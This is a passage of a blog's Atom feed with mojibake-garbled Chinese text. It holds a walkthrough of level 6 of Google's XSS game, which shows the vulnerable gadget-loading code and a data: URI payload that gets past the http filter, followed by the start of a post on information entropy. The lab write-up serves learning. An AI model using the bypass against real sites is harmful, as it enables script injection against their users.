href=&#39;javascript:doSomething()&#39;&gt;...&lt;/a&gt;</code></p><p>æ‰§è¡Œæƒé¦–å…ˆè½åœ¨doSomething()å‡½æ•°ï¼Œè‹¥å­˜åœ¨è¿”å›å€¼åˆ™å°†è¿”å›å€¼è¿”ç»™è¶…é“¾æ¥è¿›è¡Œåˆæˆ</p></blockquote><hr><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p><a href="https://xss-game.appspot.com/level6/frame#/static/gadget.js">https://xss-game.appspot.com/level6/frame#/static/gadget.js</a></p><p>æºç Â·index.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">function</span> <span class="token function">setInnerText</span><span class="token punctuation">(</span><span class="token parameter">element<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>element<span class="token punctuation">.</span>innerText<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        element<span class="token punctuation">.</span>innerText <span class="token operator">=</span> value<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        element<span class="token punctuation">.</span>textContent <span class="token operator">=</span> value<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">function</span> <span class="token function">includeGadget</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">var</span> scriptEl <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// This will totally prevent us from loading evil URLs!</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^https?:\/\/</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">setInnerText</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>          <span class="token string">"Sorry, cannot load a URL containing \"http\"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>       <span class="token comment">// Load this awesome gadget</span>      scriptEl<span class="token punctuation">.</span>src <span class="token operator">=</span> url<span class="token punctuation">;</span>       <span class="token comment">// Show log messages</span>      scriptEl<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">setInnerText</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">"Loaded gadget from "</span> <span class="token operator">+</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      scriptEl<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">setInnerText</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">"Couldn't load gadget from "</span> <span class="token operator">+</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>       document<span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>scriptEl<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token comment">// Take the value after # and use it as the gadget filename.</span>    <span class="token keyword">function</span> <span class="token function">getGadgetName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">return</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">"/static/gadget.js"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token function">includeGadget</span><span class="token punctuation">(</span><span class="token function">getGadgetName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// Extra code so that we can communicate with the parent page</span>    window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"message"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>source <span class="token operator">==</span> parent<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">includeGadget</span><span class="token punctuation">(</span><span class="token function">getGadgetName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level6<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level6.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>cube<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/level6_cube.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>log<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Loading gadget...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>level.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> context<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>path<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>gadget.js</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">/* This is a completely awesome invisible gadget */</span></code></pre><p>å…³é”®ä»£ç </p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> scriptEl <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// This will totally prevent us from loading evil URLs!</span><span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^https?:\/\/</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">setInnerText</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>               <span class="token string">"Sorry, cannot load a URL containing \"http\"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// Load this awesome gadget</span>scriptEl<span class="token punctuation">.</span>src <span class="token operator">=</span> url<span class="token punctuation">;</span></code></pre><p>ç›´æ¥åŠ è½½å¤–éƒ¨è„šæœ¬ï¼Œå¦‚å›¾æ‰€ç¤º</p><img src="/article/xss/image-20210424165312513.png" class="" title="level6-1" loading="lazy"><p>æ—¢ç„¶æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œé‚£å°±ç›´æ¥ç”¨dataæ•°æ®æµåŠ è½½å³å¯</p><p>RFC2397å¯¹dataæ•°æ®æµæœ‰è¿‡å®šä¹‰ <a href="https://tools.ietf.org/html/rfc2397">https://tools.ietf.org/html/rfc2397</a></p><p><code>data:[&lt;mediatype&gt;][;base64],&lt;data&gt;</code></p><p>payload:</p><pre class="language-none"><code class="language-none">data:text&#x2F;plain,alert(1);</code></pre><img src="/article/xss/image-20210424165650678.png" class="" title="level6-2" loading="lazy"><img src="/article/xss/image-20210424165707701.png" class="" title="level6-3" loading="lazy"><hr><p>å­¦ä¹ äº†åŸºæœ¬çš„Cross-site scripting (XSS)</p><p>è·¨ç«™ç‚¹è„šæœ¬ï¼ˆXSSï¼‰æ˜¯ä¸€ä¸ªå®‰å…¨æ¼æ´ï¼Œå¯èƒ½ä¼šå½±å“ç½‘ç«™ã€‚ è¿™ä¸ªæ¼æ´å¯èƒ½ä½¿æ”»å‡»è€…å¯ä»¥å°†è‡ªå·±çš„æ¶æ„JavaScriptä»£ç æ·»åŠ åˆ°æ˜¾ç¤ºç»™ç”¨æˆ·çš„HTMLé¡µé¢ä¸Šã€‚ ä¸€æ—¦è¢«å®³è€…çš„æµè§ˆå™¨è®¿é—®ï¼Œæ­¤ä»£ç ä¾¿å¯ä»¥æ‰§è¡Œï¼Œæ”¹å˜ç½‘ç«™çš„è¡Œä¸ºæˆ–å¤–è§‚ï¼Œçªƒå–ç§äººæ•°æ®æˆ–ä»£è¡¨ç”¨æˆ·æ‰§è¡Œæ“ä½œç­‰ç­‰</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;è°·æ­Œçš„å°æ¸¸æˆï¼Œå¤ä¹ ä¸€ä¸‹xss&lt;/p&gt;</summary>
    
    
    
    <category term="æ‚è°ˆç¬”è®°" scheme="https://err0r.top/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/"/>
    
    <category term="å­¦ä¹ ç¬”è®°" scheme="https://err0r.top/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="XSS" scheme="https://err0r.top/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>ç†µå’Œä¿¡æ¯çš„å­¦ä¹ </title>
    <link href="https://err0r.top/article/entropy/"/>
    <id>https://err0r.top/article/entropy/</id>
    <published>2021-04-12T05:27:56.000Z</published>
    <updated>2021-05-03T07:09:57.730Z</updated>
    
    <content type="html"><![CDATA[<p>æ‘¸é±¼çš„å­¦ä¹ æ€»ç»“ï¼Œæä½œå“èµ›å¿…é¡»çš„ç†è®ºå­¦ä¹ â€¦</p><a id="more"></a><blockquote><p><strong>ä¿¡æ¯æ˜¯ä»å¤šä¸ªå¯èƒ½çŠ¶æ€ä¸­ç¡®å®šå®é™…çŠ¶æ€çš„ä»£ä»·</strong></p></blockquote><p>æœ‰äº›å¹³å°çš„å›ç­”æŒºå¥½çš„ï¼Œå»ºè®®çœ‹çœ‹å‚è€ƒé“¾æ¥</p><img src="/article/entropy/640" class="" title="Entropy" loading="lazy"><p><strong>ä¾‹å­ï¼šHow much is the shirt?</strong></p><p><strong>è¡¬è¡«çš„ä»·æ ¼æ˜¯9ç£…15ä¾¿å£«ï¼Œæ‰€ä»¥ä½ é€‰æ‹©Bé¡¹ï¼Œç­”æ¡ˆå´æ˜¯Cé¡¹ã€‚</strong></p><h2 id="ä¿¡æ¯ç†µ"><a href="#ä¿¡æ¯ç†µ" class="headerlink" title="ä¿¡æ¯ç†µ"></a>ä¿¡æ¯ç†µ</h2><p>å½“ä¸€ä»¶äº‹æƒ…(å®è§‚æ€)æœ‰å¾ˆå¤šç§å¯èƒ½çš„æƒ…å†µæ—¶ï¼Œè¿™ä»¶äº‹æƒ…(å®è§‚æ€)å¯¹æŸäºº(è§‚å¯Ÿè€…)è€Œè¨€å…·ä½“æ˜¯å“ªç§æƒ…å†µ(å¾®è§‚æ€)çš„ä¸ç¡®å®šæ€§å«åšç†µ.</p><p>å³è¿™(çŸ¥æƒ…æƒ…å†µçš„ä¸ç¡®å®šæ€§)å°±æ˜¯ç†µ</p><img src="/article/entropy/image-20210412143856985.png" class="" title="ç†µ" loading="lazy"><p>è€Œèƒ½<strong>æ¶ˆé™¤è¿™ç§ä¸ç¡®å®šæ€§çš„äº‹ç‰©</strong>å°±æ˜¯ä¿¡æ¯</p><img src="/article/entropy/image-20210412144408346.png" class="" title="ä¿¡æ¯" loading="lazy"><h2 id="ä¿¡æ¯é‡"><a href="#ä¿¡æ¯é‡" class="headerlink" title="ä¿¡æ¯é‡"></a>ä¿¡æ¯é‡</h2><p>ç†µå’Œä¿¡æ¯çš„å¢å‡æ•°é‡ç›¸ç­‰ï¼Œè·å–ä¿¡æ¯çš„åŒæ—¶ä¹Ÿä¼šæ¶ˆé™¤ä¸ç¡®å®šæ€§(ç†µ)</p><blockquote><p><strong>æ¶ˆé™¤</strong>ç†µ == <strong>è·å–</strong>ä¿¡æ¯</p></blockquote><p>ä¾‹å¦‚åœ¨ä¸¾ä¾‹ä¸­ï¼ŒABCDå››ä¸ªé€‰é¡¹å¯¹äºä¸çŸ¥é“æœ€ç»ˆç­”æ¡ˆçš„äººæ¥è¯´éƒ½æ˜¯ç­‰æ¦‚ç‡(25%)çš„ï¼Œç†µåœ¨æ­¤æ—¶(ç­‰æ¦‚ç‡)æœ€å¤§ã€‚</p><p>è€Œå‘Šè¯‰ä½ ç­”æ¡ˆæ˜¯Cçš„æ—¶å€™ï¼Œè¿™æ—¶ç†µæœ€å°ã€‚</p><p>èƒ½å¤Ÿæ¶ˆé™¤ç†µçš„ä¿¡æ¯æœ‰ä¸‰ç§ç±»å‹ï¼Œæœ¬è´¨éƒ½æ˜¯èƒ½å¤Ÿ<strong>æ­£ç¡®</strong>çš„è°ƒæ•´æ¯ä¸ªå¯èƒ½æƒ…å†µçš„æ¦‚ç‡ã€‚</p><p>å¦‚æœå‘Šè¯‰ä½ <code>&quot;ç­”æ¡ˆæ˜¯ABCDä¸­çš„ä¸€ä¸ª&quot;</code>åˆ™è·å–äº†0bitçš„ä¿¡æ¯ï¼Œè¿™ç§å®šä¹‰ä¸‹ï¼Œæ²¡æœ‰å‡ä¿¡æ¯çš„è¯´æ³•ã€‚åªæœ‰èƒ½æ¶ˆé™¤æŸäººå¯¹æŸäº‹ä¸ç¡®å®šæ€§çš„äº‹ç‰©æ‰å«åšä¿¡æ¯ï¼Œå³<code>&quot;ç­”æ¡ˆæ˜¯ABCDä¸­çš„ä¸€ä¸ª&quot;</code>ä¸æ˜¯ä¿¡æ¯</p><img src="/article/entropy/image-20210412152143538.png" class="" title="ABCD" loading="lazy"><p>è€Œå‘Šè¯‰ä½ <code>&quot;Aæ˜¯æ­£ç¡®ç­”æ¡ˆ&quot;</code>ä¹Ÿä¸æ˜¯ä¿¡æ¯(æ­£ç¡®ç­”æ¡ˆä¸ºC)ï¼Œå› ä¸ºå®ƒä¸æ˜¯æ­£ç¡®çš„ã€‚</p><img src="/article/entropy/image-20210412152302898.png" class="" title="A" loading="lazy"><h3 id="ç±»å‹ä¸€ï¼šè°ƒæ•´æ¦‚ç‡"><a href="#ç±»å‹ä¸€ï¼šè°ƒæ•´æ¦‚ç‡" class="headerlink" title="ç±»å‹ä¸€ï¼šè°ƒæ•´æ¦‚ç‡"></a>ç±»å‹ä¸€ï¼šè°ƒæ•´æ¦‚ç‡</h3><p>å¬å®Œå¬åŠ›åï¼Œä½ è·å–äº†ä¸€ä¸ªæ¶ˆæ¯â€è¡¬è¡«çš„ä»·æ ¼æ˜¯9ç£…15ä¾¿å£«â€ï¼Œä»è¿™ä¸ªæ¶ˆæ¯ä¸­å¼ ä¸‰å¾—çŸ¥<code>&quot;æœ‰ä¸€åŠå¯èƒ½æ˜¯Cé€‰é¡¹&quot;</code>ï¼Œè¿™ä¸ªä¿¡æ¯å°†Cé€‰é¡¹çš„æ¦‚ç‡æé«˜åˆ°äº†50%(æä¾›äº†0.21bits)</p><img src="/article/entropy/image-20210412153329273.png" class="" title="halfC" loading="lazy"><h3 id="ç±»å‹äºŒï¼šæ’é™¤å¹²æ‰°"><a href="#ç±»å‹äºŒï¼šæ’é™¤å¹²æ‰°" class="headerlink" title="ç±»å‹äºŒï¼šæ’é™¤å¹²æ‰°"></a>ç±»å‹äºŒï¼šæ’é™¤å¹²æ‰°</h3><p>å¬å®Œå¬åŠ›åï¼Œä½ è·å–äº†ä¸€ä¸ªæ¶ˆæ¯â€è¡¬è¡«çš„ä»·æ ¼æ˜¯9ç£…15ä¾¿å£«â€ï¼Œä»è¿™ä¸ªæ¶ˆæ¯ä¸­æå››å¾—çŸ¥<code>&quot;Bé€‰é¡¹æ˜¯é”™çš„&quot;</code>ï¼Œè¿™ä¸ªä¿¡æ¯ç›´æ¥å°†Bé€‰é¡¹æ¦‚ç‡é™ä½åˆ°0%(0.415bits)</p><img src="/article/entropy/image-20210412153709078.png" class="" title="exclueB" loading="lazy"><h3 id="ç±»å‹ä¸‰ï¼šç¡®å®šæƒ…å†µ"><a href="#ç±»å‹ä¸‰ï¼šç¡®å®šæƒ…å†µ" class="headerlink" title="ç±»å‹ä¸‰ï¼šç¡®å®šæƒ…å†µ"></a>ç±»å‹ä¸‰ï¼šç¡®å®šæƒ…å†µ</h3><p>å¬å®Œå¬åŠ›åï¼Œä½ è·å–äº†ä¸€ä¸ªæ¶ˆæ¯â€è¡¬è¡«çš„ä»·æ ¼æ˜¯9ç£…15ä¾¿å£«â€ï¼Œç‹äº”è‹±è¯­éå¸¸å¥½ï¼Œä»è¿™ä¸ªæ¶ˆæ¯ä¸­ç‹äº”ç›´æ¥å¾—çŸ¥<code>&quot;Cé€‰é¡¹æ˜¯æ­£ç¡®çš„&quot;</code>ï¼Œè¿™ä¸ªä¿¡æ¯ç›´æ¥å°†Cé€‰é¡¹æ¦‚ç‡æé«˜åˆ°100%(2bits)ï¼Œç›´æ¥ç¡®å®šäº†å®é™…æƒ…å†µã€‚</p><img src="/article/entropy/image-20210412180814429.png" class="" title="C" loading="lazy"><h2 id="ä¿¡æ¯çš„æ¥æ”¶"><a href="#ä¿¡æ¯çš„æ¥æ”¶" class="headerlink" title="ä¿¡æ¯çš„æ¥æ”¶"></a>ä¿¡æ¯çš„æ¥æ”¶</h2><h3 id="åª’ä»‹æ— å…³"><a href="#åª’ä»‹æ— å…³" class="headerlink" title="åª’ä»‹æ— å…³"></a>åª’ä»‹æ— å…³</h3><p><strong>åŒä¸€ä¸ªè§‚å¯Ÿè€…å¯¹åŒä¸€ä»¶äº‹æ¥å—åˆ°çš„ä¿¡æ¯ä¸ä¼ é€’ä¿¡æ¯çš„ä¿¡å·æ¨¡å¼æ— å…³</strong></p><p>ç‹äº”å†™çº¸æ¡ç»™èµµå…­<code>&quot;ç­”æ¡ˆæ˜¯C&quot;</code>ä¼ é€’çš„ä¿¡æ¯æ˜¯2bitsï¼Œç›´æ¥å‘Šè¯‰èµµå…­ä¼ é€’çš„ä¿¡æ¯ä¹Ÿæ˜¯2bitsï¼Œæ‰“ä¸‰ä¸ªå“æŒ‡(ä¸èµµå…­çº¦å®šå¥½ï¼Œèµµå…­èƒ½å¤Ÿç†è§£)ï¼Œä¼ é€’çš„ä¿¡æ¯ä¹Ÿæ˜¯2bits</p><h3 id="ç›¸å¯¹ä¸ªä½“"><a href="#ç›¸å¯¹ä¸ªä½“" class="headerlink" title="ç›¸å¯¹ä¸ªä½“"></a>ç›¸å¯¹ä¸ªä½“</h3><p><strong>æ¥æ”¶åˆ°çš„ä¿¡æ¯æ˜¯ç›¸å¯¹äºè§‚å¯Ÿè€…å·²ç»å¯¹è¯¥äº‹æƒ…çš„å®é™…äº†è§£ç¨‹åº¦è€Œè¨€çš„</strong></p><p>ç‹äº”ä¼šè¿™é“é¢˜ï¼Œç‹äº”å¯¹è¿™é“é¢˜çš„ç†µå°±ä¸º0bitï¼Œä¸ç®¡ç‹äº”æä¸å‘Šè¯‰èµµå…­æ­£ç¡®ç­”æ¡ˆæ˜¯Cï¼Œå› ä¸ºè§‚å¯Ÿè€…ç‹äº”å·²ç»æ‹¥æœ‰è¿™ä»¶äº‹çš„æ‰€æœ‰ä¿¡æ¯ï¼Œå³ç‹äº”ç¡®å®š(çŸ¥é“)è¿™é“é¢˜çš„ç­”æ¡ˆæ˜¯Cï¼Œä¸ç¡®å®šæ€§ä»æœ€åˆå°±ä¸å­˜åœ¨ã€‚</p><p>èµµå…­ä¸ä¼šè¿™é“é¢˜ï¼Œæ‰€ä»¥èµµå…­å¯¹è¿™é“é¢˜çš„ç†µä¸º2bitsï¼Œå› ä¸ºè§‚å¯Ÿè€…èµµå…­æ²¡æœ‰å¯¹äºè¿™ä»¶äº‹çš„ä»»ä½•ä¿¡æ¯ã€‚</p><p>å¯¹äºæå››è€Œè¨€ï¼Œç‹äº”å‘Šè¯‰å¼ ä¸‰<code>&quot;ç­”æ¡ˆæ˜¯C&quot;</code>ï¼Œæä¾›ç»™æå››1.58bitsä¿¡æ¯ï¼Œå› ä¸ºè§‚å¯Ÿè€…æå››çŸ¥é“Bæ˜¯é”™çš„ï¼Œè§‚å¯Ÿè€…æ‹¥æœ‰å…³äºè¿™ä»¶äº‹æƒ…çš„éƒ¨åˆ†ä¿¡æ¯ã€‚</p><p>èµµå…­è®¤ä¸ºCæ˜¯é”™çš„ï¼Œå†å‘Šè¯‰èµµå…­ç­”æ¡ˆæ˜¯Cï¼Œç†µä¸ä¼šå‡å°‘ï¼Œå› ä¸ºæ²¡æœ‰å®é™…å¸®åŠ©èµµå…­æ¶ˆé™¤äº‹æƒ…çš„ä¸ç¡®å®šæ€§ï¼Œå› ä¸ºç†µä¸ä¼šéšç€ä¸»è§‚è‡†æƒ³è€Œå‡å°‘ï¼Œä¿¡æ¯ä¹Ÿä¸éšä¸»è§‚æ„è¯†è€Œæ”¹å˜ã€‚</p><h3 id="ç›¸å¯¹äº‹ä»¶"><a href="#ç›¸å¯¹äº‹ä»¶" class="headerlink" title="ç›¸å¯¹äº‹ä»¶"></a>ç›¸å¯¹äº‹ä»¶</h3><p><code>&quot;å¤ªé˜³ä¸œå‡è¥¿è½&quot;</code>ï¼Œè¿™å¥è¯å¯¹çŸ¥é“çš„äººæä¾›0bitä¿¡æ¯ï¼Œå¯¹çŸ¥é“æˆ–ä¸œæˆ–è¥¿å‡èµ·çš„äººæä¾›äº†1bitä¿¡æ¯ï¼Œå¯¹è®¤ä¸ºä¸œå—è¥¿åŒ—éƒ½å¯èƒ½å‡èµ·çš„äººæä¾›äº†2bitsä¿¡æ¯</p><img src="/article/entropy/image-20210412204545002.png" class="" title="ä¸œå—è¥¿åŒ—" loading="lazy"><h2 id="ä¿¡æ¯é‡çš„è®¡ç®—"><a href="#ä¿¡æ¯é‡çš„è®¡ç®—" class="headerlink" title="ä¿¡æ¯é‡çš„è®¡ç®—"></a>ä¿¡æ¯é‡çš„è®¡ç®—</h2><p>ä¿¡æ¯ä¹Ÿæ˜¯ç‰©ç†é‡ï¼Œç±»ä¼¼äº<code>åƒå…‹</code>ï¼Œé€‰ç§åƒå…‹ä¸ºå•ä½ç‰©ç†é‡ï¼Œåˆ™æµ‹é‡å…¶ä»–ç‰©ä½“çš„è´¨é‡å°±æ˜¯ä»¥å¤šå°‘ä¸ªå•ä½è´¨é‡ï¼Œå³å¤šå°‘åƒå…‹æ¥è®¡ç®—ã€‚</p><p>ä¿¡æ¯ä¹Ÿæ˜¯å‚ç…§å•ä½äº‹ä»¶çš„ä¸ç¡®å®šæ€§ï¼Œçœ‹çœ‹å¾…æµ‹äº‹ä»¶çš„ä¸ç¡®å®šæ€§ç›¸å½“äºâ€å¤šå°‘ä¸ªâ€å‚ç…§äº‹ä»¶çš„ä¸ç¡®å®šæ€§ï¼Œå…¶ä¸­â€å¤šå°‘ä¸ªâ€ï¼Œä¾¿æ˜¯ä¿¡æ¯é‡ã€‚</p><p>å¦‚æœé€‰æ‹©å‚ç…§äº‹ä»¶åƒæ˜¯æŠ›ç¡¬å¸è¿™æ ·50%ä¸¤ç§ç­‰æ¦‚ç‡æƒ…å†µçš„äº‹ä»¶æ—¶ï¼Œæµ‹é‡çš„ä¿¡æ¯é‡çš„å•ä½å°±ç§°ä¸ºæ¯”ç‰¹(bit)ã€‚</p><p>æµ‹é‡è´¨é‡æ˜¯ï¼Œå¯ä»¥ç”¨å¾…æµ‹ç‰©ä½“è´¨é‡mé™¤ä»¥å‚ç…§ç‰©ä½“è´¨é‡Bï¼Œå› ä¸ºå¾…æµ‹ç‰©ä½“è´¨é‡m=å‚ç…§ç‰©ä½“è´¨é‡B ä¹˜ å‚ç…§ç‰©ä½“ä¸ªæ•°nï¼Œæ‰€ä»¥çŸ¥é“æ€»è´¨é‡m æ±‚ ä¸ªæ•° n æ—¶ï¼Œåˆ©ç”¨é™¤æ³•è®¡ç®—å³å¯ã€‚</p><p>å¯æ˜¯æµ‹é‡ä¿¡æ¯æ—¶å´ä¸èƒ½ç”¨é™¤æ³•ï¼Œå› ä¸ºæŠ›ä¸‰æšç¡¬å¸äº§ç”Ÿçš„ç­‰å¯èƒ½ç»“æœå¹¶é $3*2=6ç§$ï¼Œè€Œæ˜¯ 